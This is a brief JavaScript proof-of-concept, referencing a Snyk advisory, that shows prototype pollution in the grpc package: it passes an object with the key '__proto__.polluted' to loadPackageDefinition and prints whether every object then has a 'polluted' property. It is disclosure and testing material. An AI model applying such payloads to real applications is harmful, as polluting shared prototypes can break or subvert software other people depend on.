//https://snyk.io/vuln/SNYK-JS-GRPC-598671

const { loadPackageDefinition } = require('grpc');
const { assert } = require('@firebase/util')

console.log({}.polluted);
loadPackageDefinition({'__proto__.polluted': "yes"});
console.log({}.polluted);
